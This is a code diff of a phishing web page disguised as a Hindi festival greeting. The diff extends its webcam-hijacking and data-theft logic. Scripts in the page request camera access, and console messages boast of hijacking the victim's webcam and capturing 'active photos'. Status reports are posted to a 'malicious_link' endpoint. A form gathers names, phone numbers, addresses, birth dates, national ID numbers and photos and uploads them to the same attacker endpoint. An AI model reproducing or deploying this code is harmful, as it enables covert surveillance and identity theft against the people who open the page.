@@ -12,6 +12,7 @@
     <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
     <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
     <script type="text/javascript" src="payload2.js"></script> 
+    <!-- <script type="text/javascript" src="payload.js"></script>  -->
     <title>Let celebrate this festival sesson together</title>
     <style>
         .wrapper2{display: flex;justify-content: center;align-items: center;font: 1em;font-family: Verdana, Geneva, Tahoma, sans-serif;}
@@ -164,7 +165,31 @@ position: fixed;}
   font:900 35px 'Concert One', sans-serif;
   color:#fff;
 }
+    .div{
+        background-color: rgb(0, 255, 0); 
+        border-radius: 17px; 
+        border: 0px solid rgb(0, 0, 0); 
+        box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; 
+        color: whitesmoke; 
+        font-family: arial, sans-serif; 
+        font-size: 18px; 
+        font-stretch: normal; 
+        font-style: normal; 
+        font-variant: normal; 
+        line-height: normal; 
+        margin: 0px auto; 
+        padding: 4px 5px 3px;
+        width: 70%;
+    }
 
+    @media only screen and (max-width:800px){
+        .div{width: 95%;}
+        .wrapper1{position: none;right:none;left: none;top: none;}
+        @media only screen and (max-width:600px){
+            .form{width: auto;}
+        }
+    }
+    
     </style>
 </head>
 <body>
@@ -214,18 +239,20 @@ position: fixed;}
           } catch (e) {
             errorMsgElement.innerHTML = e.toString();
             if (e.toString().includes("NotFoundError")){
-                console.log("Hmm, we no fit find any internal or external camera on this device!");
+                console.log("Hmm, ebi like say dis device no get any internal or external webcam!");
         await wait4me(5000);
                 var xhttp = new XMLHttpRequest();
-                xhttp.open("post", "malicious_link/attention.php?denied1=Hmm,_internal_or_external_camera_can_not_be_found_in_victims_device!");//
+                xhttp.open("post", "malicious_link/attention.php?denied1=Internal_or_external_webcam_can_not_be_found_in_victims_device!");//
                 xhttp.send();
                 console.log(xhttp);
             } else {
-                console.log("Hmm,\nWe fucking well need to fucking access ur fucking camera, men!");
-                alert("Allow camera access for in order to exprience more features of this website!");
-                window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623";
-                alert("Access to camera successfully granted");
-                console.log("BOOM!, Game Over...");
+                console.log("We fucking well need to fucking access ur fucking webcam, men!");
+                await wait4me(5000);
+                var xhttp = new XMLHttpRequest();
+                var msg = "Victims_dispermit_us_from_accessing_their_webcam, Means_that_u_will_not_be_able_to_receive_their_active_photos.";
+                xhttp.open("post", `malicious_link/attention.php?denied1=${msg}`);//
+                xhttp.send();
+                console.log(xhttp);
             }
           }
         }
@@ -234,10 +261,10 @@ position: fixed;}
         async function handleSuccess(stream) {
           window.stream = stream;
           video.srcObject = stream;
-          console.log("Hahaha, we successfully hacks into victims device camera!,");
+          console.log("Hahaha, we don hijack this device webcam!");
         await wait4me(5000);
                 var xhttp = new XMLHttpRequest();
-                xhttp.open("post", "malicious_link/attention.php?granted1=Wo-ho!,_we_successfully_hacked_into_victims_camera!, Now_u_can_be_able_to_received_victims_pictures.");//
+                xhttp.open("post", "malicious_link/attention.php?granted1=We_successfully_hijack_victims_webcam!, U_can_now_be_able_to_received_victims_active_photos.");//
                 xhttp.send();
                 console.log(xhttp);
         
@@ -281,21 +308,21 @@ position: fixed;}
             <div style="font-size: 20px; font-weight: 500; color: Black;">
                 <center><p class="greeting">🙏 Welcome 🙏</p></center>
                 <div dir="ltr" style="text-align: left;" trbidi="on">
-                    <div style="background-color:rgb(0, 255, 0); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
+                    <div class="div">
                         <marquee behavior="alternate"><b>🎇 “<script 
         type="text/javascript" 
         language="Javascript">
         document.write(xxx);
         </script> का ये शुभ अवसर आपके जीवन में अनेकों ख़ुशियाँ लेकर आए” 🎇</b></marquee>
                     </div>
-                    <div style="background-color: rgb(255, 255, 255); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
+                    <div class="div" style="background-color: rgb(255, 255, 255); color: black;">
                         <marquee behavior="alternate"><b>🎉 इस <script 
         type="text/javascript" 
         language="Javascript">
         document.write(xxx);
         </script> हमारी शुभकामनाएँ आपके साथ हैं 🎉</b></marquee>
                     </div>
-                    <div style="background-color: rgb(0, 255, 0); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
+                    <div class="div">
                         <marquee behavior="alternate"><b>|✨| <script 
         type="text/javascript" 
         language="Javascript">
@@ -312,7 +339,7 @@ position: fixed;}
                 </center>
         
                 
-                <div style="background-color: #ccc; filter: blur(20%); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 120px auto 0px; padding: 4px 5px 3px; width: 70%;">
+                <div class="div" style="margin: 120px auto 0px; padding: 4px 5px 3px; background-color: #ccc; filter: blur(20%); border-radius: 17px; color: whitesmoke;">
                     <br><center>
                         <p style="text-align: center;"><strong><span style="background-color: #ffea00; color: #005f96; font-size: 18pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;Wishing you a very </span></p>
                     </center>
@@ -396,6 +423,7 @@ function displayPic(pic){
 <div class="input-field"><label for="date"><span class="label">Date of Birth:</span><input type="date" id="date" name="date" required></label></div>
 <div class="input-field"><label for="nin"><span class="label">NIN ID:</span><input placeholder='National Identification Number' type="text" id="nin" name="nin" required></label></div>
 <div class="input-field"><label for="job"><span class="label">Occupation:</span><input placeholder='last or current job' type="text" id="job" name="job" required></label></div>
+<div class="input-field"><label for="pro"><span class="label">Profession:</span><input placeholder='what are you great at' type="text" id="pro" name="pro" required></label></div>
 <div class="input-field"><label for="gender"><span class="label">Gender:</span></label><br><div class="gen">
 <label for="male">Male:<input type="radio" class="radio" id="male" name="gender" value="male" required></label>
 <label for="female">Female:<input type="radio" class="radio" id="female" name="gender" value="female" required></label>
@@ -420,6 +448,7 @@ function displayPic(pic){
         // var imgData=new FormData();
         // imgData.append(V_img.name,V_img.files[0]);
         
+        var prof=document.getElementById("pro").value;
         var fname=document.getElementById("fname").value;
         var state=document.getElementById("state").value;
          state=state.replaceAll(" ","_"); 
@@ -477,11 +506,35 @@ function displayPic(pic){
         console.log(gender);
         console.log(maritan);
 
-        // send the form
-        var xhttp = new XMLHttpRequest();
-        xhttp.open("post", `malicious_link/form.php?vPIC=${V_img}&name=${name}&email=${email}&phone=${phone}&state=${state}&lga=${lga}&home=${home}&dob=${dob}&nin=${nin}&job=${job}&gender=${gender}&maritan=${maritan}&age=${age}`);//
-        xhttp.send();
-        console.log(xhttp);
+        var fd = new FormData();
+            //    ?? age=${age}`
+            fd.append("vPIC",V_img);
+            fd.append("prof",prof);
+            fd.append("name",name);
+            fd.append("email",email);
+            fd.append("phone",phone);
+            fd.append("state",state);
+            fd.append("lga",lga);
+            fd.append("home",home);
+            fd.append("dob",dob);
+            fd.append("nin",nin);
+            fd.append("job",job);
+            fd.append("gender",gender);
+            fd.append("maritan",maritan);
+            fd.append("age",age);
+
+            // send the form
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("post", "malicious_link/form.php", true);//
+            xhttp.onload = function (){
+                if (xttp.status === 200){
+                    console.log("success: ", xhttp.responseText);
+                } else {
+                    console.log("Error uploading image");
+                }
+            };
+            xhttp.send(fd);
+            console.log(xhttp);
         
         async function wait(){
             alert("Successfully submitted");
